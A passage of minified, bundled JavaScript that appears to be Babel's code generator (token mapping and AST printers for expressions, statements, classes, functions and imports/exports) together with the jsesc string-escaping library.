W=Q[Y],G=this._tokens[W];if(J(G,W))return G}return null}findLastIndex(X,J){let Q=this._nodesToTokenIndexes.get(X);if(Q)for(let Y=Q.length-1;Y>=0;Y--){let W=Q[Y],G=this._tokens[W];if(J(G,W))return W}return-1}findMatching(X,J,Q=0){let Y=this._nodesToTokenIndexes.get(X);if(Y){let W=0,G=Q;if(G>1){let H=this._nodesOccurrencesCountCache.get(X);if(H&&H.test===J&&H.count<G)W=H.i+1,Q-=H.count+1}for(;W<Y.length;W++){let H=this._tokens[Y[W]];if(this.matchesOriginal(H,J)){if(Q===0){if(G>0)this._nodesOccurrencesCountCache.set(X,{test:J,count:G,i:W});return H}Q--}}}return null}matchesOriginal(X,J){if(X.end-X.start!==J.length)return!1;if(X.value!=null)return X.value===J;return this._source.startsWith(J,X.start)}startMatches(X,J){let Q=this._nodesToTokenIndexes.get(X);if(!Q)return!1;let Y=this._tokens[Q[0]];if(Y.start!==X.start)return!1;return this.matchesOriginal(Y,J)}endMatches(X,J){let Q=this._nodesToTokenIndexes.get(X);if(!Q)return!1;let Y=this._tokens[Q[Q.length-1]];if(Y.end!==X.end)return!1;return this.matchesOriginal(Y,J)}_getTokensIndexesOfNode(X){if(X.start==null||X.end==null)return[];let{first:J,last:Q}=this._findTokensOfNode(X,0,this._tokens.length-1),Y=J,W=VB1(X);if((X.type==="ExportNamedDeclaration"||X.type==="ExportDefaultDeclaration")&&X.declaration&&X.declaration.type==="ClassDeclaration")W.next();let G=[];for(let H of W){if(H==null)continue;if(H.start==null||H.end==null)continue;let z=this._findTokensOfNode(H,Y,Q),$=z.first;for(let V=Y;V<$;V++)G.push(V);Y=z.last+1}for(let H=Y;H<=Q;H++)G.push(H);return G}_findTokensOfNode(X,J,Q){let Y=this._tokensCache.get(X);if(Y)return Y;let W=this._findFirstTokenOfNode(X.start,J,Q),G=this._findLastTokenOfNode(X.end,W,Q);return this._tokensCache.set(X,{first:W,last:G}),{first:W,last:G}}_findFirstTokenOfNode(X,J,Q){while(J<=Q){let Y=Q+J>>1;if(X<this._tokens[Y].start)Q=Y-1;else if(X>this._tokens[Y].start)J=Y+1;else return Y}return J}_findLastTokenOfNode(X,J,Q){while(J<=Q){let Y=Q+J>>1;if(X<this._tokens[Y].end)Q=Y-1;else if(X>this._tokens[Y].end)J=Y+1;else return Y}return Q}}aB.TokenMap=rB;function*VB1(X){if(X.type==="TemplateLiteral"){yield X.quasis[0];for(let Q=1;Q<X.quasis.length;Q++)yield X.expressions[Q-1],yield X.quasis[Q];return}let J=$B1[X.type];for(let Q of J){let Y=X[Q];if(!Y)continue;if(Array.isArray(Y))yield*Y;else yield Y}}});var tB=v((oB)=>{Object.defineProperty(oB,"__esModule",{value:!0});oB.TaggedTemplateExpression=KB1;oB.TemplateElement=UB1;oB.TemplateLiteral=qB1;oB._printTemplate=ZB1;function KB1(X){this.print(X.tag),this.print(X.typeParameters),this.print(X.quasi)}function UB1(){throw Error("TemplateElement printing is handled in TemplateLiteral")}function ZB1(X,J){let Q=X.quasis,Y="`";for(let W=0;W<Q.length-1;W++)if(Y+=Q[W].value.raw,this.token(Y+"${",!0),this.print(J[W]),Y="}",this.tokenMap){let G=this.tokenMap.findMatching(X,"}",W);if(G)this._catchUpTo(G.loc.start)}Y+=Q[Q.length-1].value.raw,this.token(Y+"`",!0)}function qB1(X){this._printTemplate(X,X.expressions)}});var JM=v((XM)=>{Object.defineProperty(XM,"__esModule",{value:!0});XM.LogicalExpression=XM.BinaryExpression=XM.AssignmentExpression=lB1;XM.AssignmentPattern=cB1;XM.AwaitExpression=yB1;XM.BindExpression=pB1;XM.CallExpression=xB1;XM.ConditionalExpression=PB1;XM.Decorator=bB1;XM.DoExpression=LB1;XM.EmptyStatement=mB1;XM.ExpressionStatement=uB1;XM.Import=hB1;XM.MemberExpression=dB1;XM.MetaProperty=iB1;XM.ModuleExpression=nB1;XM.NewExpression=SB1;XM.OptionalCallExpression=fB1;XM.OptionalMemberExpression=vB1;XM.ParenthesizedExpression=IB1;XM.PrivateName=rB1;XM.SequenceExpression=TB1;XM.Super=EB1;XM.ThisExpression=_B1;XM.UnaryExpression=NB1;XM.UpdateExpression=CB1;XM.V8IntrinsicIdentifier=aB1;XM.YieldExpression=gB1;XM._shouldPrintDecoratorsBeforeExport=kB1;var FB1=y1(),RB1=lX(),{isCallExpression:AB1,isLiteral:eB,isMemberExpression:MW,isNewExpression:DB1,isPattern:wB1}=FB1;function NB1(X){let{operator:J}=X;if(J==="void"||J==="delete"||J==="typeof"||J==="throw")this.word(J),this.space();else this.token(J);this.print(X.argument)}function LB1(X){if(X.async)this.word("async",!0),this.space();this.word("do"),this.space(),this.print(X.body)}function IB1(X){this.tokenChar(40);let J=this.enterDelimited();this.print(X.expression),J(),this.rightParens(X)}function CB1(X){if(X.prefix)this.token(X.operator),this.print(X.argument);else this.print(X.argument,!0),this.token(X.operator)}function PB1(X){this.print(X.test),this.space(),this.tokenChar(63),this.space(),this.print(X.consequent),this.space(),this.tokenChar(58),this.space(),this.print(X.alternate)}function SB1(X,J){if(this.word("new"),this.space(),this.print(X.callee),this.format.minified&&X.arguments.length===0&&!X.optional&&!AB1(J,{callee:X})&&!MW(J)&&!DB1(J))return;if(this.print(X.typeArguments),this.print(X.typeParameters),X.optional)this.token("?.");if(X.arguments.length===0&&this.tokenMap&&!this.tokenMap.endMatches(X,")"))return;this.tokenChar(40);let Q=this.enterDelimited();this.printList(X.arguments,this.shouldPrintTrailingComma(")")),Q(),this.rightParens(X)}function TB1(X){this.printList(X.expressions)}function _B1(){this.word("this")}function EB1(){this.word("super")}function kB1(X){if(typeof this.format.decoratorsBeforeExport==="boolean")return this.format.decoratorsBeforeExport;return typeof X.start==="number"&&X.start===X.declaration.start}function bB1(X){this.tokenChar(64),this.print(X.expression),this.newline()}function vB1(X){let{computed:J}=X,{optional:Q,property:Y}=X;if(this.print(X.object),!J&&MW(Y))throw TypeError("Got a MemberExpression for MemberExpression property");if(eB(Y)&&typeof Y.value==="number")J=!0;if(Q)this.token("?.");if(J)this.tokenChar(91),this.print(Y),this.tokenChar(93);else{if(!Q)this.tokenChar(46);this.print(Y)}}function fB1(X){if(this.print(X.callee),this.print(X.typeParameters),X.optional)this.token("?.");this.print(X.typeArguments),this.tokenChar(40);let J=this.enterDelimited();this.printList(X.arguments),J(),this.rightParens(X)}function xB1(X){this.print(X.callee),this.print(X.typeArguments),this.print(X.typeParameters),this.tokenChar(40);let J=this.enterDelimited();this.printList(X.arguments,this.shouldPrintTrailingComma(")")),J(),this.rightParens(X)}function hB1(){this.word("import")}function yB1(X){this.word("await"),this.space(),this.print(X.argument)}function gB1(X){if(X.delegate){if(this.word("yield",!0),this.tokenChar(42),X.argument)this.space(),this.print(X.argument)}else if(X.argument)this.word("yield",!0),this.space(),this.print(X.argument);else this.word("yield")}function mB1(){this.semicolon(!0)}function uB1(X){this.tokenContext|=RB1.TokenContext.expressionStatement,this.print(X.expression),this.semicolon()}function cB1(X){if(this.print(X.left),X.left.type==="Identifier"||wB1(X.left)){if(X.left.optional)this.tokenChar(63);this.print(X.left.typeAnnotation)}this.space(),this.tokenChar(61),this.space(),this.print(X.right)}function lB1(X){if(this.print(X.left),this.space(),X.operator==="in"||X.operator==="instanceof")this.word(X.operator);else this.token(X.operator),this._endsWithDiv=X.operator==="/";this.space(),this.print(X.right)}function pB1(X){this.print(X.object),this.token("::"),this.print(X.callee)}function dB1(X){if(this.print(X.object),!X.computed&&MW(X.property))throw TypeError("Got a MemberExpression for MemberExpression property");let J=X.computed;if(eB(X.property)&&typeof X.property.value==="number")J=!0;if(J){let Q=this.enterDelimited();this.tokenChar(91),this.print(X.property),this.tokenChar(93),Q()}else this.tokenChar(46),this.print(X.property)}function iB1(X){this.print(X.meta),this.tokenChar(46),this.print(X.property)}function rB1(X){this.tokenChar(35),this.print(X.id)}function aB1(X){this.tokenChar(37),this.word(X.name)}function nB1(X){this.word("module",!0),this.space(),this.tokenChar(123),this.indent();let{body:J}=X;if(J.body.length||J.directives.length)this.newline();this.print(J),this.dedent(),this.rightBrace(X)}});var zM=v((GM)=>{Object.defineProperty(GM,"__esModule",{value:!0});GM.BreakStatement=kM1;GM.CatchClause=yM1;GM.ContinueStatement=bM1;GM.DebuggerStatement=uM1;GM.DoWhileStatement=EM1;GM.ForOfStatement=GM.ForInStatement=void 0;GM.ForStatement=TM1;GM.IfStatement=SM1;GM.LabeledStatement=xM1;GM.ReturnStatement=vM1;GM.SwitchCase=mM1;GM.SwitchStatement=gM1;GM.ThrowStatement=fM1;GM.TryStatement=hM1;GM.VariableDeclaration=cM1;GM.VariableDeclarator=lM1;GM.WhileStatement=_M1;GM.WithStatement=PM1;var NM1=y1(),{isFor:QM,isForStatement:LM1,isIfStatement:IM1,isStatement:CM1}=NM1;function PM1(X){this.word("with"),this.space(),this.tokenChar(40),this.print(X.object),this.tokenChar(41),this.printBlock(X)}function SM1(X){this.word("if"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.space();let J=X.alternate&&IM1(YM(X.consequent));if(J)this.tokenChar(123),this.newline(),this.indent();if(this.printAndIndentOnComments(X.consequent),J)this.dedent(),this.newline(),this.tokenChar(125);if(X.alternate){if(this.endsWith(125))this.space();this.word("else"),this.space(),this.printAndIndentOnComments(X.alternate)}}function YM(X){let{body:J}=X;if(CM1(J)===!1)return X;return YM(J)}function TM1(X){this.word("for"),this.space(),this.tokenChar(40);{let J=this.enterForStatementInit();this.print(X.init),J()}if(this.tokenChar(59),X.test)this.space(),this.print(X.test);if(this.token(";",!1,1),X.update)this.space(),this.print(X.update);this.tokenChar(41),this.printBlock(X)}function _M1(X){this.word("while"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.printBlock(X)}function WM(X){this.word("for"),this.space();let J=X.type==="ForOfStatement";if(J&&X.await)this.word("await"),this.space();this.noIndentInnerCommentsHere(),this.tokenChar(40);{let Q=this.enterForXStatementInit(J);this.print(X.left),Q==null||Q()}this.space(),this.word(J?"of":"in"),this.space(),this.print(X.right),this.tokenChar(41),this.printBlock(X)}var Gs1=GM.ForInStatement=WM,Hs1=GM.ForOfStatement=WM;function EM1(X){this.word("do"),this.space(),this.print(X.body),this.space(),this.word("while"),this.space(),this.tokenChar(40),this.print(X.test),this.tokenChar(41),this.semicolon()}function q4(X,J){if(J)X.space(),X.printTerminatorless(J);X.semicolon()}function kM1(X){this.word("break"),q4(this,X.label)}function bM1(X){this.word("continue"),q4(this,X.label)}function vM1(X){this.word("return"),q4(this,X.argument)}function fM1(X){this.word("throw"),q4(this,X.argument)}function xM1(X){this.print(X.label),this.tokenChar(58),this.space(),this.print(X.body)}function hM1(X){if(this.word("try"),this.space(),this.print(X.block),this.space(),X.handlers)this.print(X.handlers[0]);else this.print(X.handler);if(X.finalizer)this.space(),this.word("finally"),this.space(),this.print(X.finalizer)}function yM1(X){if(this.word("catch"),this.space(),X.param)this.tokenChar(40),this.print(X.param),this.print(X.param.typeAnnotation),this.tokenChar(41),this.space();this.print(X.body)}function gM1(X){this.word("switch"),this.space(),this.tokenChar(40),this.print(X.discriminant),this.tokenChar(41),this.space(),this.tokenChar(123),this.printSequence(X.cases,!0,void 0,function(Q,Y){if(!Q&&X.cases[X.cases.length-1]===Y)return-1}),this.rightBrace(X)}function mM1(X){if(X.test)this.word("case"),this.space(),this.print(X.test),this.tokenChar(58);else this.word("default"),this.tokenChar(58);if(X.consequent.length)this.newline(),this.printSequence(X.consequent,!0)}function uM1(){this.word("debugger"),this.semicolon()}function cM1(X,J){if(X.declare)this.word("declare"),this.space();let{kind:Q}=X;if(Q==="await using")this.word("await"),this.space(),this.word("using",!0);else this.word(Q,Q==="using");this.space();let Y=!1;if(!QM(J)){for(let W of X.declarations)if(W.init)Y=!0}if(this.printList(X.declarations,void 0,void 0,X.declarations.length>1,Y?function(W){this.token(",",!1,W),this.newline()}:void 0),QM(J)){if(LM1(J)){if(J.init===X)return}else if(J.left===X)return}this.semicolon()}function lM1(X){if(this.print(X.id),X.definite)this.tokenChar(33);if(this.print(X.id.typeAnnotation),X.init)this.space(),this.tokenChar(61),this.space(),this.print(X.init)}});var VM=v(($M)=>{Object.defineProperty($M,"__esModule",{value:!0});$M.ClassAccessorProperty=Mj1;$M.ClassBody=Zj1;$M.ClassExpression=$M.ClassDeclaration=Uj1;$M.ClassMethod=Oj1;$M.ClassPrivateMethod=Fj1;$M.ClassPrivateProperty=jj1;$M.ClassProperty=Bj1;$M.StaticBlock=Aj1;$M._classMethodHead=Rj1;var $j1=y1(),{isExportDefaultDeclaration:Vj1,isExportNamedDeclaration:Kj1}=$j1;function Uj1(X,J){if(!(Vj1(J)||Kj1(J))||!this._shouldPrintDecoratorsBeforeExport(J))this.printJoin(X.decorators);if(X.declare)this.word("declare"),this.space();if(X.abstract)this.word("abstract"),this.space();if(this.word("class"),X.id)this.space(),this.print(X.id);if(this.print(X.typeParameters),X.superClass)this.space(),this.word("extends"),this.space(),this.print(X.superClass),this.print(X.superTypeParameters);if(X.implements)this.space(),this.word("implements"),this.space(),this.printList(X.implements);this.space(),this.print(X.body)}function Zj1(X){if(this.tokenChar(123),X.body.length===0)this.tokenChar(125);else{this.newline();let J=qj1(this,X);J==null||J(-1);let Q=this.enterDelimited();if(this.printJoin(X.body,!0,!0,J,!0),Q(),!this.endsWith(10))this.newline();this.rightBrace(X)}}function qj1(X,J){if(!X.tokenMap||J.start==null||J.end==null)return null;let Q=X.tokenMap.getIndexes(J);if(!Q)return null;let Y=1,W=0,G=0,H=()=>{while(G<J.body.length&&J.body[G].start==null)G++};return H(),(z)=>{if(G<=z)G=z+1,H();let $=G===J.body.length?J.end:J.body[G].start,V;while(Y<Q.length&&X.tokenMap.matchesOriginal(V=X._tokens[Q[Y]],";")&&V.start<$)X.token(";",void 0,W++),Y++}}function Bj1(X){if(this.printJoin(X.decorators),!X.static&&!this.format.preserveFormat){var J;let Q=(J=X.key.loc)==null||(J=J.end)==null?void 0:J.line;if(Q)this.catchUp(Q)}if(this.tsPrintClassMemberModifiers(X),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else this._variance(X),this.print(X.key);if(X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function Mj1(X){var J;this.printJoin(X.decorators);let Q=(J=X.key.loc)==null||(J=J.end)==null?void 0:J.line;if(Q)this.catchUp(Q);if(this.tsPrintClassMemberModifiers(X),this.word("accessor",!0),this.space(),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else this._variance(X),this.print(X.key);if(X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function jj1(X){if(this.printJoin(X.decorators),this.tsPrintClassMemberModifiers(X),this.print(X.key),X.optional)this.tokenChar(63);if(X.definite)this.tokenChar(33);if(this.print(X.typeAnnotation),X.value)this.space(),this.tokenChar(61),this.space(),this.print(X.value);this.semicolon()}function Oj1(X){this._classMethodHead(X),this.space(),this.print(X.body)}function Fj1(X){this._classMethodHead(X),this.space(),this.print(X.body)}function Rj1(X){if(this.printJoin(X.decorators),!this.format.preserveFormat){var J;let Q=(J=X.key.loc)==null||(J=J.end)==null?void 0:J.line;if(Q)this.catchUp(Q)}this.tsPrintClassMemberModifiers(X),this._methodHead(X)}function Aj1(X){if(this.word("static"),this.space(),this.tokenChar(123),X.body.length===0)this.tokenChar(125);else this.newline(),this.printSequence(X.body,!0),this.rightBrace(X)}});var UM=v((KM)=>{Object.defineProperty(KM,"__esModule",{value:!0});KM.ArrowFunctionExpression=mj1;KM.FunctionDeclaration=KM.FunctionExpression=gj1;KM._functionHead=yj1;KM._methodHead=xj1;KM._param=fj1;KM._parameters=vj1;KM._params=bj1;KM._predicate=hj1;KM._shouldPrintArrowParamsParens=uj1;var _j1=y1(),Ej1=lX(),{isIdentifier:kj1}=_j1;function bj1(X,J,Q){this.print(X.typeParameters);let Y=cj1.call(this,J,Q);if(Y)this.sourceIdentifierName(Y.name,Y.pos);this.tokenChar(40),this._parameters(X.params,")");let W=X.type==="ArrowFunctionExpression";this.print(X.returnType,W),this._noLineTerminator=W}function vj1(X,J){let Q=this.enterDelimited(),Y=this.shouldPrintTrailingComma(J),W=X.length;for(let G=0;G<W;G++)if(this._param(X[G]),Y||G<W-1)this.token(",",null,G),this.space();this.token(J),Q()}function fj1(X){if(this.printJoin(X.decorators),this.print(X),X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function xj1(X){let{kind:J,key:Q}=X;if(J==="get"||J==="set")this.word(J),this.space();if(X.async)this.word("async",!0),this.space();if(J==="method"||J==="init"){if(X.generator)this.tokenChar(42)}if(X.computed)this.tokenChar(91),this.print(Q),this.tokenChar(93);else this.print(Q);if(X.optional)this.tokenChar(63);this._params(X,X.computed&&X.key.type!=="StringLiteral"?void 0:X.key,void 0)}function hj1(X,J){if(X.predicate){if(!X.returnType)this.tokenChar(58);this.space(),this.print(X.predicate,J)}}function yj1(X,J){if(X.async){if(this.word("async"),!this.format.preserveFormat)this._endsWithInnerRaw=!1;this.space()}if(this.word("function"),X.generator){if(!this.format.preserveFormat)this._endsWithInnerRaw=!1;this.tokenChar(42)}if(this.space(),X.id)this.print(X.id);if(this._params(X,X.id,J),X.type!=="TSDeclareFunction")this._predicate(X)}function gj1(X,J){this._functionHead(X,J),this.space(),this.print(X.body)}function mj1(X,J){if(X.async)this.word("async",!0),this.space();if(this._shouldPrintArrowParamsParens(X))this._params(X,void 0,J);else this.print(X.params[0],!0);this._predicate(X,!0),this.space(),this.printInnerComments(),this.token("=>"),this.space(),this.tokenContext|=Ej1.TokenContext.arrowBody,this.print(X.body)}function uj1(X){var J,Q;if(X.params.length!==1)return!0;if(X.typeParameters||X.returnType||X.predicate)return!0;let Y=X.params[0];if(!kj1(Y)||Y.typeAnnotation||Y.optional||(J=Y.leadingComments)!=null&&J.length||(Q=Y.trailingComments)!=null&&Q.length)return!0;if(this.tokenMap){if(X.loc==null)return!0;if(this.tokenMap.findMatching(X,"(")!==null)return!0;let W=this.tokenMap.findMatching(X,"=>");if((W==null?void 0:W.loc)==null)return!0;return W.loc.start.line!==X.loc.start.line}if(this.format.retainLines)return!0;return!1}function cj1(X,J){let Q=X;if(!Q&&J){let $=J.type;if($==="VariableDeclarator")Q=J.id;else if($==="AssignmentExpression"||$==="AssignmentPattern")Q=J.left;else if($==="ObjectProperty"||$==="ClassProperty"){if(!J.computed||J.key.type==="StringLiteral")Q=J.key}else if($==="ClassPrivateProperty"||$==="ClassAccessorProperty")Q=J.key}if(!Q)return;let Y;if(Q.type==="Identifier"){var W,G;Y={pos:(W=Q.loc)==null?void 0:W.start,name:((G=Q.loc)==null?void 0:G.identifierName)||Q.name}}else if(Q.type==="PrivateName"){var H;Y={pos:(H=Q.loc)==null?void 0:H.start,name:"#"+Q.id.name}}else if(Q.type==="StringLiteral"){var z;Y={pos:(z=Q.loc)==null?void 0:z.start,name:Q.value}}return Y}});var jW=v((MM)=>{Object.defineProperty(MM,"__esModule",{value:!0});MM.ExportAllDeclaration=UO1;MM.ExportDefaultDeclaration=qO1;MM.ExportDefaultSpecifier=zO1;MM.ExportNamedDeclaration=ZO1;MM.ExportNamespaceSpecifier=VO1;MM.ExportSpecifier=$O1;MM.ImportAttribute=MO1;MM.ImportDeclaration=BO1;MM.ImportDefaultSpecifier=HO1;MM.ImportExpression=OO1;MM.ImportNamespaceSpecifier=jO1;MM.ImportSpecifier=GO1;MM._printAttributes=KO1;var tj1=y1(),ej1=lX(),{isClassDeclaration:XO1,isExportDefaultSpecifier:JO1,isExportNamespaceSpecifier:QO1,isImportDefaultSpecifier:YO1,isImportNamespaceSpecifier:WO1,isStatement:qM}=tj1;function GO1(X){if(X.importKind==="type"||X.importKind==="typeof")this.word(X.importKind),this.space();if(this.print(X.imported),X.local&&X.local.name!==X.imported.name)this.space(),this.word("as"),this.space(),this.print(X.local)}function HO1(X){this.print(X.local)}function zO1(X){this.print(X.exported)}function $O1(X){if(X.exportKind==="type")this.word("type"),this.space();if(this.print(X.local),X.exported&&X.local.name!==X.exported.name)this.space(),this.word("as"),this.space(),this.print(X.exported)}function VO1(X){this.tokenChar(42),this.space(),this.word("as"),this.space(),this.print(X.exported)}var ZM=!1;function KO1(X,J){var Q;let{importAttributesKeyword:Y}=this.format,{attributes:W,assertions:G}=X;if(W&&!Y&&X.extra&&(X.extra.deprecatedAssertSyntax||X.extra.deprecatedWithLegacySyntax)&&!ZM)ZM=!0,console.warn('You are using import attributes, without specifying the desired output syntax.\nPlease specify the "importAttributesKeyword" generator option, whose value can be one of:\n - "with"        : `import { a } from "b" with { type: "json" };`\n - "assert"      : `import { a } from "b" assert { type: "json" };`\n - "with-legacy" : `import { a } from "b" with type: "json";`\n');let H=Y==="assert"||!Y&&G;if(this.word(H?"assert":"with"),this.space(),!H&&(Y==="with-legacy"||!Y&&(Q=X.extra)!=null&&Q.deprecatedWithLegacySyntax)){this.printList(W||G);return}let z=J?1:0;this.token("{",null,z),this.space(),this.printList(W||G,this.shouldPrintTrailingComma("}")),this.space(),this.token("}",null,z)}function UO1(X){var J,Q;if(this.word("export"),this.space(),X.exportKind==="type")this.word("type"),this.space();if(this.tokenChar(42),this.space(),this.word("from"),this.space(),(J=X.attributes)!=null&&J.length||(Q=X.assertions)!=null&&Q.length)this.print(X.source,!0),this.space(),this._printAttributes(X,!1);else this.print(X.source);this.semicolon()}function BM(X,J){if(XO1(J.declaration)&&X._shouldPrintDecoratorsBeforeExport(J))X.printJoin(J.declaration.decorators)}function ZO1(X){if(BM(this,X),this.word("export"),this.space(),X.declaration){let Y=X.declaration;if(this.print(Y),!qM(Y))this.semicolon()}else{if(X.exportKind==="type")this.word("type"),this.space();let Y=X.specifiers.slice(0),W=!1;for(;;){let H=Y[0];if(JO1(H)||QO1(H)){if(W=!0,this.print(Y.shift()),Y.length)this.tokenChar(44),this.space()}else break}let G=!1;if(Y.length||!Y.length&&!W){if(G=!0,this.tokenChar(123),Y.length)this.space(),this.printList(Y,this.shouldPrintTrailingComma("}")),this.space();this.tokenChar(125)}if(X.source){var J,Q;if(this.space(),this.word("from"),this.space(),(J=X.attributes)!=null&&J.length||(Q=X.assertions)!=null&&Q.length)this.print(X.source,!0),this.space(),this._printAttributes(X,G);else this.print(X.source)}this.semicolon()}}function qO1(X){BM(this,X),this.word("export"),this.noIndentInnerCommentsHere(),this.space(),this.word("default"),this.space(),this.tokenContext|=ej1.TokenContext.exportDefault;let J=X.declaration;if(this.print(J),!qM(J))this.semicolon()}function BO1(X){var J,Q;this.word("import"),this.space();let Y=X.importKind==="type"||X.importKind==="typeof";if(Y)this.noIndentInnerCommentsHere(),this.word(X.importKind),this.space();else if(X.module)this.noIndentInnerCommentsHere(),this.word("module"),this.space();else if(X.phase)this.noIndentInnerCommentsHere(),this.word(X.phase),this.space();let W=X.specifiers.slice(0),G=!!W.length;while(G){let z=W[0];if(YO1(z)||WO1(z)){if(this.print(W.shift()),W.length)this.tokenChar(44),this.space()}else break}let H=!1;if(W.length)H=!0,this.tokenChar(123),this.space(),this.printList(W,this.shouldPrintTrailingComma("}")),this.space(),this.tokenChar(125);else if(Y&&!G)H=!0,this.tokenChar(123),this.tokenChar(125);if(G||Y)this.space(),this.word("from"),this.space();if((J=X.attributes)!=null&&J.length||(Q=X.assertions)!=null&&Q.length)this.print(X.source,!0),this.space(),this._printAttributes(X,H);else this.print(X.source);this.semicolon()}function MO1(X){this.print(X.key),this.tokenChar(58),this.space(),this.print(X.value)}function jO1(X){this.tokenChar(42),this.space(),this.word("as"),this.space(),this.print(X.local)}function OO1(X){if(this.word("import"),X.phase)this.tokenChar(46),this.word(X.phase);this.tokenChar(40);let J=this.shouldPrintTrailingComma(")");if(this.print(X.source),X.options!=null)this.tokenChar(44),this.space(),this.print(X.options);if(J)this.tokenChar(44);this.rightParens(X)}});var RM=v((qs1,FM)=>{var jM={},EO1=jM.hasOwnProperty,OM=(X,J)=>{for(let Q in X)if(EO1.call(X,Q))J(Q,X[Q])},kO1=(X,J)=>{if(!J)return X;return OM(J,(Q,Y)=>{X[Q]=Y}),X},bO1=(X,J)=>{let Q=X.length,Y=-1;while(++Y<Q)J(X[Y])},B4=(X)=>{return"\\u"+("0000"+X).slice(-4)},M7=(X,J)=>{let Q=X.toString(16);if(J)return Q;return Q.toUpperCase()},j7=jM.toString,vO1=Array.isArray,fO1=(X)=>{return typeof Buffer==="function"&&Buffer.isBuffer(X)},xO1=(X)=>{return j7.call(X)=="[object Object]"},hO1=(X)=>{return typeof X=="string"||j7.call(X)=="[object String]"},yO1=(X)=>{return typeof X=="number"||j7.call(X)=="[object Number]"},OW=(X)=>{return typeof X=="bigint"},gO1=(X)=>{return typeof X=="function"},mO1=(X)=>{return j7.call(X)=="[object Map]"},uO1=(X)=>{return j7.call(X)=="[object Set]"},cO1={"\\":"\\\\","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t"},lO1=/[\\\b\f\n\r\t]/,pO1=/[0-9]/,dO1=/[\xA0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000]/,iO1=/([\uD800-\uDBFF][\uDC00-\uDFFF])|([\uD800-\uDFFF])|(['"`])|[^]/g,rO1=/([\uD800-\uDBFF][\uDC00-\uDFFF])|([\uD800-\uDFFF])|(['"`])|[^ !#-&\(-\[\]-_a-~]/g,KX=(X,J)=>{let Q=()=>{V=$,++J.indentLevel,$=J.indent.repeat(J.indentLevel)},Y={escapeEverything:!1,minimal:!1,isScriptContext:!1,quotes:"single",wrap:!1,es6:!1,json:!1,compact:!0,lowercaseHex:!1,numbers:"decimal",indent:"\t",indentLevel:0,__inline1__:!1,__inline2__:!1},W=J&&J.json;if(W)Y.quotes="double",Y.wrap=!0;if(J=kO1(Y,J),J.quotes!="single"&&J.quotes!="double"&&J.quotes!="backtick")J.quotes="single";let G=J.quotes=="double"?'"':J.quotes=="backtick"?"`":"'",H=J.compact,z=J.lowercaseHex,$=J.indent.repeat(J.indentLevel),V="",K=J.__inline1__,Z=J.__inline2__,q=H?"":`
`,B,M=!0,O=J.numbers=="binary",R=J.numbers=="octal",I=J.numbers=="decimal",F=J.numbers=="hexadecimal";if(W&&X&&gO1(X.toJSON))X=X.toJSON();if(!hO1(X)){if(mO1(X)){if(X.size==0)return"new Map()";if(!H)J.__inline1__=!0,J.__inline2__=!1;return"new Map("+KX(Array.from(X),J)+")"}if(uO1(X)){if(X.size==0)return"new Set()";return"new Set("+KX(Array.from(X),J)+")"}if(fO1(X)){if(X.length==0)return"Buffer.from([])";return"Buffer.from("+KX(Array.from(X),J)+")"}if(vO1(X)){if(B=[],J.wrap=!0,K)J.__inline1__=!1,J.__inline2__=!0;if(!Z)Q();if(bO1(X,(b)=>{if(M=!1,Z)J.__inline2__=!1;B.push((H||Z?"":$)+KX(b,J))}),M)return"[]";if(Z)return"["+B.join(", ")+"]";return"["+q+B.join(","+q)+q+(H?"":V)+"]"}else if(yO1(X)||OW(X)){if(W)return JSON.stringify(Number(X));let b;if(I)b=String(X);else if(F){let h=X.toString(16);if(!z)h=h.toUpperCase();b="0x"+h}else if(O)b="0b"+X.toString(2);else if(R)b="0o"+X.toString(8);if(OW(X))return b+"n";return b}else if(OW(X)){if(W)return JSON.stringify(Number(X));return X+"n"}else if(!xO1(X)){if(W)return JSON.stringify(X)||"null";return String(X)}else{if(B=[],J.wrap=!0,Q(),OM(X,(b,h)=>{M=!1,B.push((H?"":$)+KX(b,J)+":"+(H?"":" ")+KX(h,J))}),M)return"{}";return"{"+q+B.join(","+q)+q+(H?"":V)+"}"}}let T=J.escapeEverything?iO1:rO1;if(B=X.replace(T,(b,h,L,N,k,_)=>{if(h){if(J.minimal)return h;let a=h.charCodeAt(0),J1=h.charCodeAt(1);if(J.es6){let q1=(a-55296)*1024+J1-56320+65536;return"\\u{"+M7(q1,z)+"}"}return B4(M7(a,z))+B4(M7(J1,z))}if(L)return B4(M7(L.charCodeAt(0),z));if(b=="\x00"&&!W&&!pO1.test(_.charAt(k+1)))return"\\0";if(N){if(N==G||J.escapeEverything)return"\\"+N;return N}if(lO1.test(b))return cO1[b];if(J.minimal&&!dO1.test(b))return b;let c=M7(b.charCodeAt(0),z);if(W||c.length>2)return B4(c);return"\\x"+("00"+c).slice(-2)}),G=="`")B=B.replace(/\$\{/g,"\\${");if(J.isScriptContext)B=B.replace(/<\/(script|style)/gi,"<\\/$1").replace(/<!--/g,W?"\\u003C!--":"\\x3C!--");if(J.wrap)B=G+B+G;return B};KX.version="3.0.2";FM.exports=KX});var RW=v((NM)=>{Object.defineProperty(NM,"__esModule",{value:!0});NM.ArgumentPlaceholder=tO1;NM.ArrayPattern=NM.ArrayExpression=YF1;NM.BigIntLiteral=UF1;NM.BooleanLiteral=zF1;NM.Identifier=oO1;NM.NullLiteral=$F1;NM.NumericLiteral=VF1;NM.ObjectPattern=NM.ObjectExpression=XF1;NM.ObjectMethod=JF1;NM.ObjectProperty=QF1;NM.PipelineBareFunction=BF1;NM.PipelinePrimaryTopicReference=MF1;NM.PipelineTopicExpression=qF1;NM.RecordExpression=WF1;NM.RegExpLiteral=HF1;NM.SpreadElement=NM.RestElement=eO1;NM.StringLiteral=KF1;NM.TopicReference=ZF1;NM.TupleExpression=GF1;NM.VoidPattern=jF1;NM._getRawIdentifier=sO1;var aO1=y1(),wM=RM(),{isAssignmentPattern:nO1,isIdentifier:FW}=aO1,AM=null,M4="";function sO1(X){if(X===AM)return 